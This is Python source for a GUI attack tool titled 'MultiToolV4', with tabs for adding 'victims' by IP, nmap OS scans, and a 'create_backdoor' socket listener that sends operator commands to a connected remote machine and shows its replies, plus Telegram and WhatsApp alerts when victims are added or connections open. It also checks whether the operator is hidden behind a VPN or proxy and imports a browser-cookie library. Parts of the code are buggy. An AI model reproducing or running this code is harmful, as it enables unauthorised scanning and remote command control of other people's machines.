import socket
import subprocess
import nmap
import threading
import logging
from logging.handlers import RotatingFileHandler
import browser_cookie3
import autopy
from PyQt5 import QtWidgets, QtCore
import requests
from telethon import TelegramClient
import pywhatkit as kit
import facebook
import openai
import os
import sys
import asyncio
import json
from PyQt5.QtGui import QTextCursor, QMessageBox

# ===================== Logging Setup ===================== #
if not os.path.exists('logs'):
    os.makedirs('logs')

log_file = os.path.join('logs', 'multi_tool.log')
log_handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024, backupCount=5)
logging.basicConfig(handlers=[log_handler], level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# ===================== API Credentials Setup ===================== #
try:
    with open('config/api_credentials.json', 'r') as cred_file:
        api_credentials = json.load(cred_file)
except Exception as e:
    logging.error(f"Error reading API credentials: {e}")
    api_credentials = {}

API_ID = api_credentials.get('telegram_api_id', '')
API_HASH = api_credentials.get('telegram_api_hash', '')
BOT_TOKEN = api_credentials.get('telegram_bot_token', '')
FACEBOOK_TOKEN = api_credentials.get('facebook_access_token', '')
WHATSAPP_PHONE_NUMBER = api_credentials.get('whatsapp_phone_number', '')
openai.api_key = api_credentials.get("openai_api_key", "")

WEBHOOK_URL = api_credentials.get("webhook_url", "")

# Initialize Telegram Client
telegram_client = TelegramClient('bot', API_ID, API_HASH)

# ===================== Helper Functions ===================== #

def show_error_popup(error_message):
    """Shows an error popup with an AI suggestion."""
    msg = QMessageBox()
    msg.setIcon(QMessageBox.Critical)
    msg.setText("Error Encountered!")
    msg.setInformativeText(error_message)
    msg.setWindowTitle("Error")
    msg.exec_()

def restart_app():
    """Restart the application."""
    QtCore.QCoreApplication.quit()
    status = subprocess.call([sys.executable, os.path.realpath(__file__)])

def kill_switch():
    """Kill all threads and stop the app."""
    logging.info("Kill Switch activated. Shutting down the application.")
    sys.exit()

# ===================== Check Public IP and VPN/Proxy Status ===================== #
def get_public_ip():
    """Check the system's public IP address."""
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        ip = response.json().get('ip')
        logging.info(f"Public IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to retrieve public IP: {e}")
        return "Error retrieving public IP"

def check_vpn_or_proxy(ip):
    """Check if the system is using a VPN or proxy service based on the public IP."""
    try:
        vpn_check_url = f"https://vpnapi.io/api/{ip}?key=your_vpn_api_key"
        response = requests.get(vpn_check_url)
        data = response.json()
        if data.get('security', {}).get('vpn'):
            logging.info(f"VPN detected for IP: {ip}")
            return True, "VPN is active."
        elif data.get('security', {}).get('proxy'):
            logging.info(f"Proxy detected for IP: {ip}")
            return True, "Proxy is active."
        else:
            logging.info(f"No VPN or Proxy detected for IP: {ip}")
            return False, "No VPN or Proxy detected."
    except Exception as e:
        logging.error(f"Failed to check VPN/Proxy status: {e}")
        return False, "Error checking VPN/Proxy status."

# ===================== AI VPN/Proxy Setup Assistance ===================== #
def setup_vpn_proxy(output_area):
    """Use OpenAI to provide steps for setting up a VPN or ProxyChains."""
    try:
        prompt = "Provide steps to configure either a VPN (OpenVPN, WireGuard) or ProxyChains on a Linux system."
        response = openai.Completion.create(
            model="text-davinci-003",
            prompt=prompt,
            max_tokens=200
        )
        steps = response.choices[0].text.strip()
        output_area.setTextColor(QtCore.Qt.yellow)
        output_area.append(f"💡 AI Setup Steps: {steps}")
        logging.info(f"AI VPN/Proxy Setup Steps: {steps}")
    except Exception as e:
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ AI Error in providing VPN/Proxy setup steps: {str(e)}")
        logging.error(f"AI VPN/Proxy setup error: {e}")
        show_error_popup(f"AI Error: {str(e)}")

# ===================== API Key Validation ===================== #
def validate_api_keys(output_area, credentials):
    missing_keys = [key for key, value in credentials.items() if not value]
    if missing_keys:
        missing_str = ", ".join(missing_keys)
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ Error: Missing API keys for {missing_str}\n")
        logging.error(f"Missing API keys: {missing_str}")
        show_error_popup(f"Missing API keys: {missing_str}")
        return False
    output_area.setTextColor(QtCore.Qt.green)
    output_area.append("✅ All API keys validated.\n")
    return True

# ===================== AI Error Handling ===================== #
def detect_and_fix_errors(error_message, output_area):
    try:
        response = openai.Completion.create(
            model="text-davinci-003",
            prompt=f"Error detected: {error_message}. Suggest a fix.",
            max_tokens=150
        )
        suggestion = response.choices[0].text.strip()
        output_area.setTextColor(QtCore.Qt.yellow)
        output_area.append(f"💡 AI Suggestion: {suggestion}")
        logging.info(f"AI Suggestion: {suggestion}")
    except Exception as e:
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ AI Error Detection Failed: {str(e)}")
        logging.error(f"OpenAI error: {e}")
        show_error_popup(f"AI Error: {str(e)}")

# ===================== Webhook Notification ===================== #
def send_webhook_notification(message):
    if WEBHOOK_URL:
        try:
            payload = {"text": message}
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 200:
                logging.info("Webhook notification sent successfully.")
            else:
                logging.error(f"Failed to send webhook notification: {response.status_code}")
        except Exception as e:
            logging.error(f"Webhook error: {str(e)}")
            show_error_popup(f"Webhook error: {str(e)}")

# ===================== Bot Notifications ===================== #
async def telegram_bot_notify(message, output_area):
    try:
        if not telegram_client.is_connected():
            await telegram_client.start(bot_token=BOT_TOKEN)
        await telegram_client.send_message('me', message)
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append("✅ Telegram notification sent.\n")
    except Exception as e:
        handle_exception(e, output_area)
        send_webhook_notification(message)

def send_telegram_notification_async(message, output_area):
    asyncio.create_task(telegram_bot_notify(message, output_area))

def whatsapp_notify(message, phone_number, output_area):
    try:
        kit.sendwhatmsg_instantly(phone_number, message)
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append("✅ WhatsApp message sent successfully.\n")
        logging.info(f"WhatsApp message sent to {phone_number}")
    except Exception as e:
        handle_exception(e, output_area)
        send_webhook_notification(message)

def setup_facebook_bot(output_area):
    try:
        graph = facebook.GraphAPI(access_token=FACEBOOK_TOKEN)
        graph.put_object(parent_object='me', connection_name='feed', message="Monitoring vulnerabilities.")
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append("✅ Facebook bot setup complete.")
    except Exception as e:
        handle_exception(e, output_area)
        send_webhook_notification("Monitoring vulnerabilities")

# ===================== Victim Monitoring ===================== #
victims = []

def add_victim(ip_address, output_area):
    if not validate_ip(ip_address):
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ Invalid IP address: {ip_address}\n")
        logging.error(f"Invalid IP address: {ip_address}")
        return

    victims.append(ip_address)
    output_area.setTextColor(QtCore.Qt.green)
    output_area.append(f"✅ Monitoring victim: {ip_address}\n")
    
    message = f"⚠️ Vulnerability detected at {ip_address}."
    send_telegram_notification_async(message, output_area)
    whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)

def validate_ip(ip):
    import re
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(ip_pattern, ip) is not None

# ===================== Scanning and Backdoor ===================== #
def scan_target(rhost, output_area):
    try:
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments="-Pn -sT -O")
        result = f"🖥️ Target OS: {nm[rhost]['osclass'][0]['osfamily']}\n{nm.csv()}"
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append(result)
    except Exception as e:
        handle_exception(e)

def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.setTextColor(QtCore.Qt.blue)
        output_area.append(f"🔒 Listening on {lhost}:{port}...\n")
        logging.info(f"Listening on {lhost}:{port}")
        conn, addr = sock.accept()
        output_area.setTextColor(QtCore.Qt.green)
        output_area.append(f"🔓 Connection established with {addr}\n")
        logging.info(f"Connection established with {addr}")
        
        message = f"⚠️ Backdoor connection established with {addr}"
        send_telegram_notification_async(message, output_area)
        whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
        
        while not stop_event.is_set():
            cmd, ok = QtWidgets.QInputDialog.getText(None, "Command Input", "Enter command:")
            if not ok or cmd.lower() in ['exit', 'quit']:
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            output_area.setTextColor(QtCore.Qt.green)
            output_area.append(response + '\n')
        conn.close()
    except Exception as e:
        handle_exception(e)

# ===================== Error Handling ===================== #
def handle_exception(exception, output_area=None):
    error_message = str(exception)
    logging.error(error_message)
    if output_area:
        output_area.setTextColor(QtCore.Qt.red)
        output_area.append(f"❌ Error: {error_message}")
        detect_and_fix_errors(error_message, output_area)

# ===================== GUI Application ===================== #
class MultiToolV4(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.stop_event = threading.Event()

    def init_ui(self):
        self.setWindowTitle('MultiToolV4 by kdairatchi 🛠️')
        self.setGeometry(100, 100, 800, 600)

        central_widget = QtWidgets.QWidget(self)
        self.setCentralWidget(central_widget)
        layout = QtWidgets.QVBoxLayout(central_widget)

        self.tabs = QtWidgets.QTabWidget()
        layout.addWidget(self.tabs)

        self.add_bot_tab()
        self.add_victim_monitor_tab()
        self.add_privacy_check_tab()
        self.add_error_handling_tab()

        self.show()

    def add_bot_tab(self):
        bot_tab = QtWidgets.QWidget()
        self.bot_output = QtWidgets.QTextEdit()
        self.bot_output.setReadOnly(True)
        setup_button = QtWidgets.QPushButton("Setup Bots 🚀")
        setup_button.clicked.connect(lambda: self.setup_bots())
        layout = QtWidgets.QVBoxLayout(bot_tab)
        layout.addWidget(self.bot_output)
        layout.addWidget(setup_button)
        self.tabs.addTab(bot_tab, "Bot Setup 🤖")

    def add_victim_monitor_tab(self):
        victim_tab = QtWidgets.QWidget()
        self.victim_output = QtWidgets.QTextEdit()
        self.victim_output.setReadOnly(True)
        victim_ip_input = QtWidgets.QLineEdit()
        victim_ip_input.setPlaceholderText("Enter victim's IP address")
        add_victim_button = QtWidgets.QPushButton("Add Victim 🎯")
        add_victim_button.clicked.connect(lambda: add_victim(victim_ip_input.text(), self.victim_output))
        layout = QtWidgets.QVBoxLayout(victim_tab)
        layout.addWidget(victim_ip_input)
        layout.addWidget(self.victim_output)
        layout.addWidget(add_victim_button)
        self.tabs.addTab(victim_tab, "Victim Monitor 🔍")

    def add_privacy_check_tab(self):
        privacy_tab = QtWidgets.QWidget()
        self.privacy_output = QtWidgets.QTextEdit()
        self.privacy_output.setReadOnly(True)
        check_privacy_button = QtWidgets.QPushButton("Check IP/Privacy Status 🔒")
        check_privacy_button.clicked.connect(self.check_privacy_status)
        layout = QtWidgets.QVBoxLayout(privacy_tab)
        layout.addWidget(self.privacy_output)
        layout.addWidget(check_privacy_button)
        self.tabs.addTab(privacy_tab, "Privacy Status 🌐")

    def add_error_handling_tab(self):
        error_handling_tab = QtWidgets.QWidget()
        self.error_output = QtWidgets.QTextEdit()
        self.error_output.setReadOnly(True)
        layout = QtWidgets.QVBoxLayout(error_handling_tab)
        layout.addWidget(self.error_output)
        self.tabs.addTab(error_handling_tab, "Error Handling ⚠️")

    def setup_bots(self):
        if validate_api_keys(self.bot_output, api_credentials):
            try:
                message = "🤖 Bots connected to APIs."
                self.bot_output.append(message)
                send_telegram_notification_async("Bots are active. 🔔", self.bot_output)
                setup_facebook_bot(self.bot_output)
            except Exception as e:
                handle_exception(e, self.bot_output)

    def check_privacy_status(self):
        ip = get_public_ip()
        vpn_proxy_status, message = check_vpn_or_proxy(ip)
        self.privacy_output.setTextColor(QtCore.Qt.green if vpn_proxy_status else QtCore.Qt.red)
        self.privacy_output.append(f"Public IP: {ip}\n{message}")
        setup_vpn_proxy(self.privacy_output)  # AI suggestions for VPN/Proxy setup

    def start_backdoor_thread(self):
        self.stop_event.clear()
        threading.Thread(target=create_backdoor, args=("localhost", 8080, self.bot_output, self.stop_event), daemon=True).start()

    def stop_backdoor_thread(self):
        self.stop_event.set()

    def restart_application(self):
        restart_app()

    def activate_kill_switch(self):
        kill_switch()

# ===================== Main Application Entry Point ===================== #
def main():
    app = QtWidgets.QApplication(sys.argv)
    gui = MultiToolV4()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
